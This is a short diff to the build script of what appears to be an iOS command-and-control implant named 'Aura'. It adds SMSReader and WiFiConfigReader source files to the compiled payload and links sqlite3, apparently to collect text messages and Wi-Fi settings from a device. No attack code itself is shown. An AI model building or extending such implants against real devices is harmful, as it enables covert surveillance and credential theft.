@@ -202,7 +202,9 @@ class Aura(PayloadType):
             "C2CheckIn.m",
             "c2_profiles/HTTPC2Config.m",
             "SystemInfoHelper.m",
-            "C2Task.m"
+            "C2Task.m",
+            "SMSReader.m",
+            "WiFiConfigReader.m"
         ]
 
         source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
@@ -214,6 +216,7 @@ class Aura(PayloadType):
             f"-I {self.agent_code_path}/c2_profiles "
             f"{source_file_paths} "
             f"-framework Foundation -framework UIKit "
+            f"-lsqlite3 "
             f"-o {self.aura_payload_path} "
         )
 
